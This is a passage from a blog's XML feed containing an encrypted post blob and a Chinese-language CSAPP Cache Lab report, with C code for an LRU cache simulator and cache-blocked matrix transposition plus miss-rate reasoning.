c68467775468b7b1bc3624da52f928806248cae98e370aec99017f838a220fcacdde10c20394c0dffd63f723b0c22ce8a9399a826290de78647d9b8645950bc4309fde36b5e0b883041fbb1f4d9afe016b2cc0be5caa96af427c18475ee7f9dc285f194151ae75a8c8dd6e4cf24b569818389dcecdeac1ae9d0c69106b9d0ef597cf9dc108a66b5124a31077946b2f0f828d9a4dde50da9dbde185d0bf1e2697e93f5f9c0ee01a40631bbc37512ea06815a20c82f039093f1fe140a9605d56b637239b1a28f2babdfe653266d635e2ee44d4e451a9bd8d775e25ff9c3af3f07414c288dae254ca32c5c08f464775f192037f625f7445287d187ecefbb81ab2710333787bb6bb3134db27eea26a2cd2908c3aea91d3198a5515a3ae774aa7b628ce6dcf884fb1bdb3365a0e043133e91784bae5cab936e85e10cba3e9fe94916b03d4f3d941112e7fc0cf77d036bd24cda6341264346bf107664ed3b34613d45e9241b2a75cc7095a12abe3c2a16a53230527917c954b4e856d9586f55bf08d334efd0fe54191b49d352b23e08105d66d52b8579218dd418d9972061931a7250d4c6cf0ea965a26ed53ddb28eecf3702a1c0b2cadfd263490e492834565f7586730f6b0b49c067cec89ea6c86a4180d049f01612f182cb150ec9b0ed076aacf9e601b576f80666d5c26b61188ea1e89678d7cc49cfde84d1f65db9cc081ba278efcb0f0a9a676d4de262e9b4c6c5d545efaacff967c0428d3fbeb3861eeebc6e2587b44c6b06ece26744b0da54e8820828bcb5b2a0ddd262372df6886108698e57e524569308968fee840b8537c0ba5e2123d2162ad2a2e4498cb04ed21f9fa5d3c28148672e02638c75d22a9e07df7ad93d7ebcec763ddab2909eaadca75a6c309ede71b5c6e9c9fc7b827a74d6da298c538717e3aae5b6eb5a1d4e41aa19d5e9ec62e476558044420e530dbf6fb47b849af3156504e37b58e50b8f48928c5813c8d4f3045be820e70dc217d5fde3f7c2f028f0c29bf24fe0216ae102c277ccb711669ec57de884017531fb017b826b59301f6c5876671fa07cc0fbae2e7952c7d7acd9cea2baaeca9db5dee17f9a81f0302c4300fb1cf6d7fdcd30de0f8ff9a952804f1eab4bc3008bbe5507bf65652c1a56f2a498ffcf08df5a35146afa23be316806d555c7b63d0edd1c2a6db47088b93a4377ec79b3ba8b24dbd237c390c6209e5dfb3c7c578f51159b72caf07e8bf7035c0a1e93ed709a5d47a5446399540a96b5a62953b00be7b061d81626d3a7fac3f06fe3474e9559cc937639aafa9923d0578c74677f8db3598e15f93e32ffa29aaa58b5b04aaaa21f880cc8c42241a6137b2b798e416bf843aefbc59c5e147e6afd8e4ae73cc810c0007b6ba34a473bff9621f60b1ac01958ec5bcb253fd81fb33a7d2dac2b1b0c20d6a7387acf7f2ed24e0435bfaa9b10de1f95b4db44c068026c34f73cc5133aa4fbeb43dd18f9d98070c1a430bf9a40582b217cf1d4d419dea7445f150be0a7c00677d04f9d7af4efac46e3c056b9f4871693a221946d00b839fa66cb871e9090acf266f87297542bcfc6ca05d850e106203d5189e5ceb4fae3213c242aa83e4c505af972e5736fe46ed4a9c3a7dd2b90daa7fe9cd2931b62753ef3e22955f1e84395b5809318ec38a1fe8158e863f2e867e4f34734adf972b1bc2dbc67e55d35a1fe20cb81652247935a0621ff866f3362c95970a5b511de1d573b787a1122a26048c8c1482be90312ae1d4f300291ce72fb62a681bae2b79383fef355def7920f5bb3fc1b56ca607fd987ba7e6f19aedf2618bc06576e4a46529573a6ebcc656cb0d46309dc6774bad14796a538bb8c49e7ad826c39810f08ab3b724cfd902c4b81e052dbdf3510715fa96a809caa9798eb21c72634dcd0af87552f0746d65be07db82220245a2c9c28b5b1a70fb618b09e16d99d804e66e914b9f20817061f05d8d302cee6e3674d3125118c947c6667dbc035283dddf6f95cf88479491fd47b6474480b53a2fda95035a813a80e4b8dfd785d29c6dd312e37f1b995235fb53de59b4fa50b8991479c49da09200b23590dae9be5168207376598adf434e5229ff4d88d457271b1096ca970c153e60ac0562a88cf7363cacc441ba0073157d77b6a798ee3bd770c940b1f06e1a116ca0ad2463b72ebd4b9ab68000586304ea40cc4b3f115f60eb3b3a14104c4e4978589ba39b026352d2cbd46f16bfe9d2b58eb8376b8354995fdbdaf63ab881ba64720c3396d759db05f78d3c44559e75f922d45d002cc3917a3b397f6e4f7a742f7a0d4498f43259c9fccc23bceedb76db22f8169b3f7a3c2894d449d7f1cde72497974be85162e1bc004fb3b1cdeac650aa5f96fc739352d8904ca510e06dbe6a00073eb8e7feb9537ad79dd3dfea4acf05051a566c3606cbcb79f2e9d3c2edcf2fbb39c8c6e7b09912f0f39d699ab09ee633ef9f9aa0a18bb610101b67491a385bc59c5df3b25b957c56ea8d1378f299ee297c9d7c625c553e608b86f0c89b8adb79aa2601ffc0383550f9c71d7fe56535d3ec8cdcbd55c43074bd6105502e245988ae0f2e556f466c409bd9db99536fdfeab15be89db7d097072c3fd9f157d9e334530c2955994626c08c22ccbc4755c14a1f43d9532e1dde0a6e632ca0e87b2ec85a74dc7ddbda359805cb92cf0fe83c20d69e9bf895ac0deee207c79c3bd98ef91dd5631ce17e3817f371537d73dfc3b63d002a7c3307a2337b27c20d666d3a93baea9e9b0c02092ff2cf835d94b25f5cdf02f2cb3c264c3a06c737d2369e283d6c0d3c3e47742cd1107dabf59bf1fda527091eafe93e12eacfc1cab12cc03b024e9f2b795009fa0bc3b3c2de4e22e7f6b3f6b14bd14a136d7eab42211030eb592051b0e43afa702708bcf546750e700ccdbe3178d02fe4fb2bc9a6b85b3708cf01e69155c5bd2711b7ba7d1a4377055f629ae34c572c1be04d6310f6eb8792dc5564fb656819e2b84880bb5e149fa45f71d4e931ab8e6008f633b69d06314b4d7f1e5ca75f66a4228d6590a28d423635ca9e44731f7490abb4a8925c102bc472a0f42c72f365e7471ddcb6066c3e3538e0241e8b8af5798e2c9209787ea84144f957847e3357cb221a6275a1052a4c9b91c379233b2a5c7e6ad50d1c834a0ac3835c74fee43cb2da9a77076636e4b218ee11772b44d13ea29e72688f13bddefff6617a84562cffae86b28b207f045754a9c2a8284c7733e0bf382d68ca9d888cee2cb8c43e906e898ee304904998ce3be5b2eaf96d6e0c1ca8808616e92c8d1ba8ae732e16fe8e6dab7b8a10c2ae3911225bc0450374430bfbad1d9e8997336a5d7632914b3fa4a81dd326d667da9f480bdcde9db0a89ab584ef7376daa5248380a507c7498bf25ffe1b3e81bb1a9b1e5a33fed5f3acec8943a7a03cca11fcadee716c6a43c722cc5b77ec6ec01978ab543866da43da9fe6ec3aade3d2a12501b1b5e52157ca8341b8f9e21f0794e281a2b56ad0535ee994a7a48b8e37584938893defd0708348bd1c4192cf9938e77c0dcdb99b3b5ab1d6e416f024d64369e625699380593749c8d5d2e7a9b327e7ad570b26407bb3c4bbaed2e0911fda625463f113144f97e13c1b7a9fc498cb23a732ddbb59020a44168cc12d957de512614d9a10b22a6226c4d5f6ed3e82ac935dbd43073bd962233f6632cd12e99afc4ce3f6985866911d4fe50cc9e272652d71c121f77091412ecb8fcfccc99ed4897d0fd3677955c499a6ce0df7cca4529cc45f3ce58424775f468e486637d9d04686aa36503297566ee1c347d72fa382c63e90155b6d4dc6600a8879823d4e1045c996ddffc2111a1f6b20a9a1c0a39e802cdd8061b15bfa5a8bd5fd909dd3ef008f51c992854c4d0c799066380e823db0fe7e89460ab9f1d1c87e3d14a275713979546eda297878a94cc9138101b87dfa0b0f16bef7639867bfe831e0aaa5dc3ffda48bc9b427a9ec875dc4c14df1df13a6c3c757fa23fe6fc7cbb6acf53ea7ae934206bddc5cdc3414b41757b61b682de4966a9f53755b1e7e8ca8b40e2e70cd1e715bcdc35790654fba4ecb9e159843e28c13261349b18836bd7eba4905203c9df37ff7f8c264950cab92bea9d29a0ccf8a42b331cf42143211798141cc5d6d50bd93719ccf2d775f35c9ab0c20e5480d7032dd1ea081a3a1d49f6ec0df800378f74f6d97fb85d5bdbfd448ed97eca9d5bc39236e21cb3005eeefd887c6e51852391da8affdbc1ea1de84c61d40aa3c6253e1211335937977f444ee316f32b8481fb3231f31d89b7f03047f30c718148d947567298bf784d114b2624bd598899f163f0c19943410ad5f0e2b7b3104816d017c35e2b381265960c9d9f8aeb4fdef91f8b9116c812b342a8b701cd70dddcb655cc75a199a18305d06fd6745e83735eb3eac94e250a0d78668c0b46d468a4e6d41c53fed827856168c6fb49f2050de8181e83c99b38989a05dba42c79216560ae6a5f747f49183bbe702a60453de08c0df35014ccde009351a70cc099af923df74dc03f4acf917a2109ba395697e1ecda9702f304d2a2407f9ec7ab00be048d0280bb0f4d2fce8515df4972a73829beef13f5f09d81b63ca170ce3de8096d64305c01fdca2900c63dd95ca47748a887cc5622101616764a0fb3bf621737d64ceeb729c88ffded2698f8121ff38a79f955d197e98ca9e0757ccd10000fcbe179f861efab26b561a1af75c5bd834c0fc5869f73a9d77818eea9083257f235cecec886433debc9e9564f533a487a3bf269df4b1475ff56f35ea65614e37043af2a909bd4cb1077c24f17d6e0b7e2ad5051358d5f5bf0bf9a8e1f9af5e6a0ca7ece9af188ed2e3d0863ba7334e39d6caa6cf47835454af8d830a7fc9616102c9267c1b55455d01d16dff78629c8c38740de2c443c8fa515396c78bd906fa1b16d7374ebc15939c8eb144b352a6ef1907a576bf73cc77558ba2b31d445e6b7fa4a6970d88206d4ede3622091828df2f905c6ea04c4ff3a8edc7be5e6b7</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>Cache Lab实验报告</title>
    <url>/2020/04/29/Cache-Lab/</url>
    <content><![CDATA[<p><img src="/2020/04/29/Cache-Lab/csapp.jpg" alt></p>
<a id="more"></a>
<h1 id="csapp-cache-lab解题报告"><a class="markdownIt-Anchor" href="#csapp-cache-lab解题报告"></a> CSAPP Cache Lab解题报告</h1>
<h3 id="任务a"><a class="markdownIt-Anchor" href="#任务a"></a> 任务A</h3>
<p><strong>实现代码：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADDR_SIZE 64;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span>* filePath;</span><br><span class="line">    <span class="keyword">int</span> setNum;</span><br><span class="line">    <span class="keyword">int</span> lineNum;</span><br><span class="line">    <span class="keyword">int</span> blockNum;</span><br><span class="line">    <span class="keyword">bool</span> verbose;</span><br><span class="line">&#125;GlobalArgs;</span><br><span class="line">GlobalArgs globalArgs;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> tag;</span><br><span class="line">    <span class="keyword">int</span> timestamp;</span><br><span class="line">&#125;CacheLine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span>* optString=<span class="string">&quot;hvs:E:b:t:&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintHelp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;Usage: ./csim [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;Options:&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;  -h         Print this help message&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;  -v         Optional verbose flag&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;  -s &lt;num&gt;   Number of set index bits.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;  -E &lt;num&gt;   Number of lines per set.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;  -b &lt;num&gt;   Number of block offset bits&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;  -t &lt;file&gt;  Trace file.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;Examples:&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;  linux&gt;  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;  linux&gt;  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetArgus</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> opt=getopt(argc,argv,optString);</span><br><span class="line">    <span class="keyword">while</span> (opt!=<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (opt)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">                PrintHelp();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">                globalArgs.verbose=<span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">                globalArgs.setNum=atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">                globalArgs.lineNum=atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">                globalArgs.blockNum=atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">                globalArgs.filePath=optarg;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;wrong argument\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        opt=getopt(argc,argv,optString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TryToHitCache</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> address,<span class="keyword">int</span>* hit,<span class="keyword">int</span>* miss,<span class="keyword">int</span>* eviction,CacheLine* cache)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> timestamp=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> tagLen=<span class="number">64</span>-(globalArgs.setNum+globalArgs.blockNum);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">set</span>=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)((address&lt;&lt;tagLen)&gt;&gt;(tagLen+globalArgs.blockNum));</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> tag=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(address&gt;&gt;(<span class="number">64</span>-tagLen));</span><br><span class="line">    <span class="keyword">int</span> min=globalArgs.lineNum*<span class="built_in">set</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;globalArgs.lineNum;i++)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> idx=<span class="built_in">set</span>*globalArgs.lineNum+i;</span><br><span class="line">        <span class="keyword">if</span>(cache[idx].tag==tag&amp;&amp;cache[idx].timestamp!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cache[idx].timestamp=++timestamp;</span><br><span class="line">            (*hit)++;</span><br><span class="line">            <span class="keyword">if</span>(globalArgs.verbose)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;hit &quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(cache[idx].timestamp==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cache[idx].timestamp=++timestamp;</span><br><span class="line">            (*miss)++;</span><br><span class="line">            cache[idx].tag=tag;</span><br><span class="line">            <span class="keyword">if</span>(globalArgs.verbose)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;miss &quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(cache[idx].timestamp&lt;cache[min].timestamp)</span><br><span class="line">            min=idx;</span><br><span class="line">    &#125;</span><br><span class="line">    cache[min].timestamp=++timestamp;</span><br><span class="line">    cache[min].tag=tag;</span><br><span class="line">    (*miss)++;</span><br><span class="line">    (*eviction)++;</span><br><span class="line">    <span class="keyword">if</span>(globalArgs.verbose)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;miss eviction &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    SetArgus(argc,argv);</span><br><span class="line">    <span class="keyword">if</span>(globalArgs.filePath==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    FILE* fp=fopen(globalArgs.filePath,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;File not found %s\n&quot;</span>,globalArgs.filePath);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> hit=<span class="number">0</span>,miss=<span class="number">0</span>,eviction=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> S=(<span class="number">1</span>&lt;&lt;globalArgs.setNum);</span><br><span class="line">    <span class="keyword">int</span> E=globalArgs.lineNum;</span><br><span class="line"></span><br><span class="line">     CacheLine* cache=<span class="built_in">calloc</span>(S*E, <span class="keyword">sizeof</span>(CacheLine));</span><br><span class="line"></span><br><span class="line">     <span class="keyword">char</span> opt;</span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">long</span> address;</span><br><span class="line">     <span class="keyword">int</span> block;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     <span class="keyword">while</span>(<span class="built_in">fscanf</span>(fp,<span class="string">&quot; %c %lx,%d&quot;</span>, &amp;opt,&amp;address,&amp;block)&gt;<span class="number">0</span>)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="string">&#x27;I&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(globalArgs.verbose)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c %lx,%d &quot;</span>,opt,address,block);</span><br><span class="line">        &#125;</span><br><span class="line">        TryToHitCache(address,&amp;hit,&amp;miss,&amp;eviction,cache);</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="string">&#x27;M&#x27;</span>)</span><br><span class="line">            TryToHitCache(address,&amp;hit,&amp;miss,&amp;eviction,cache);</span><br><span class="line">        <span class="keyword">if</span>(globalArgs.verbose)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     fclose(fp);</span><br><span class="line">     <span class="built_in">free</span>(cache);</span><br><span class="line"></span><br><span class="line">     printSummary(hit,miss,eviction);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>任务A就是打开文件读入数据、处理数据、输出数据的过程，核心逻辑就是在于怎么模拟一个高速缓存来处理数据。我们将这部分逻辑封装在了<code>void TryToHitCache(unsigned long address,int* hit,int* miss,int* eviction,CacheLine* cache)</code>这个函数中。</p>
<p>首先我们定义一个静态变量<code>static int timestamp</code>，这个变量用来记录CPU向高速缓存器访问的时间戳（用来记录访问次数）。在该函数里我们需要接受几个参数，分别为请求的地址，hit次数，miss次数，eviction次数以及模拟的高速缓存器。然后我们将address的各部分结构进行解析，分别得到了set、tag等参数。</p>
<p>然后我们遍历模拟高速缓存器的组，比较address解析的set数是否与模拟缓存器的set数相同和是否可能为冷未命中的情况下。</p>
<p>如果能找到相同的tag且不是冷未命中的话，就将hit++，且更改<code>timestamp</code>的值。如果是冷未命中的话，就将miss++，并且更新<code>timestamp</code>的值并且设置该块的值。</p>
<p>如果则两种情况都不是的话，则需要更换块的内容。那么我们需要更新哪个块呢？根据局部性原则，我们应当更新距离我们这次访问时间戳距离最远的块，因此我们遍历一遍该组并找出该块并进行更换。然后进行更新数据。</p>
<h3 id="任务b"><a class="markdownIt-Anchor" href="#任务b"></a> 任务B:</h3>
<p><strong>实现代码：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a1,a2,a3,a4,a5,a6,a7,a8;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,h;</span><br><span class="line">    <span class="keyword">if</span>(N==<span class="number">32</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(k=i*<span class="number">8</span>;k&lt;(i+<span class="number">1</span>)*<span class="number">8</span>;k++)&#123;</span><br><span class="line">                    h=j*<span class="number">8</span>;</span><br><span class="line">                    a1=A[k][h];a2=A[k][h+<span class="number">1</span>];a3=A[k][h+<span class="number">2</span>];a4=A[k][h+<span class="number">3</span>];</span><br><span class="line">                    a5=A[k][h+<span class="number">4</span>];a6=A[k][h+<span class="number">5</span>];a7=A[k][h+<span class="number">6</span>];a8=A[k][h+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                    B[h][k]=a1;B[h+<span class="number">1</span>][k]=a2;B[h+<span class="number">2</span>][k]=a3;B[h+<span class="number">3</span>][k]=a4;</span><br><span class="line">                    B[h+<span class="number">4</span>][k]=a5;B[h+<span class="number">5</span>][k]=a6;B[h+<span class="number">6</span>][k]=a7;B[h+<span class="number">7</span>][k]=a8;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(N==<span class="number">64</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i+=<span class="number">8</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">64</span>;j+=<span class="number">8</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(k=j;k&lt;j+<span class="number">4</span>;++k)&#123;</span><br><span class="line">                    a1=A[k][i];a2=A[k][i+<span class="number">1</span>];a3=A[k][i+<span class="number">2</span>];a4=A[k][i+<span class="number">3</span>];</span><br><span class="line">                    a5=A[k][i+<span class="number">4</span>];a6=A[k][i+<span class="number">5</span>];a7=A[k][i+<span class="number">6</span>];a8=A[k][i+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                    B[i][k]=a1;B[i][k+<span class="number">4</span>]=a5;B[i+<span class="number">1</span>][k]=a2;B[i+<span class="number">1</span>][k+<span class="number">4</span>]=a6;</span><br><span class="line">                    B[i+<span class="number">2</span>][k]=a3;B[i+<span class="number">2</span>][k+<span class="number">4</span>]=a7;B[i+<span class="number">3</span>][k]=a4;B[i+<span class="number">3</span>][k+<span class="number">4</span>]=a8;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span>(k=i;k&lt;i+<span class="number">4</span>;++k)&#123;</span><br><span class="line">                    a1=B[k][j+<span class="number">4</span>];a2=B[k][j+<span class="number">5</span>];a3=B[k][j+<span class="number">6</span>];a4=B[k][j+<span class="number">7</span>];</span><br><span class="line">                    a5=A[j+<span class="number">4</span>][k];a6=A[j+<span class="number">5</span>][k];a7=A[j+<span class="number">6</span>][k];a8=A[j+<span class="number">7</span>][k];</span><br><span class="line"></span><br><span class="line">                    B[k][j+<span class="number">4</span>]=a5;B[k][j+<span class="number">5</span>]=a6;B[k][j+<span class="number">6</span>]=a7;B[k][j+<span class="number">7</span>]=a8;</span><br><span class="line">                    B[k+<span class="number">4</span>][j]=a1;B[k+<span class="number">4</span>][j+<span class="number">1</span>]=a2;B[k+<span class="number">4</span>][j+<span class="number">2</span>]=a3;B[k+<span class="number">4</span>][j+<span class="number">3</span>]=a4;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span>(k=i+<span class="number">4</span>;k&lt;i+<span class="number">8</span>;++k)&#123;</span><br><span class="line">                    a1=A[j+<span class="number">4</span>][k];a2=A[j+<span class="number">5</span>][k];a3=A[j+<span class="number">6</span>][k];a4=A[j+<span class="number">7</span>][k];</span><br><span class="line"></span><br><span class="line">                    B[k][j+<span class="number">4</span>]=a1;B[k][j+<span class="number">5</span>]=a2;B[k][j+<span class="number">6</span>]=a3;B[k][j+<span class="number">7</span>]=a4;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i+=<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;M;j+=<span class="number">16</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(k=i;k&lt;i+<span class="number">16</span>&amp;&amp;k&lt;N;k++)&#123;</span><br><span class="line">                    <span class="keyword">for</span>(h=j;h&lt;j+<span class="number">16</span>&amp;&amp;h&lt;M;h++)&#123;</span><br><span class="line">                        B[h][k]=A[k][h];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>本题很明显要使用分块进行优化，但分块后如下后距离答案要求的数量还有不少距离。</p>
<p>我这里参考了网上大神们的做法。</p>
<p><strong>32×32：</strong></p>
<p>第一题要求miss次数在300以下，首先观察，Cache的一个块只有32B，也就是只能容纳8个int。这个Cache可以容纳这个matrix的前8行。分块的话，肯定是取8×8的比较合适。先读取A的一行，然后放入B的一列。12个int变量，4个用来循环，其余8个用来存A中块的一行。</p>
<p>对于在对角线上的块，A中每读一行，会有一次miss，也就是miss次数是读取操作的1/8，对于B数组的话，第一次读取这行会产生一次miss，之后对于第i行，只有A中读到第i行的时候，会被移除出Cache，然后存的时候会产生一次miss。可以粗略计算为miss次数是读取次数的1/4。</p>
<p>对于不在对角线上的块，做转置的时候，A还是1/8的miss率，B的每行在Cache中和A的行不冲突 ，所以也是1/8的miss率，我们计算下最后大概多少次miss呢？</p>
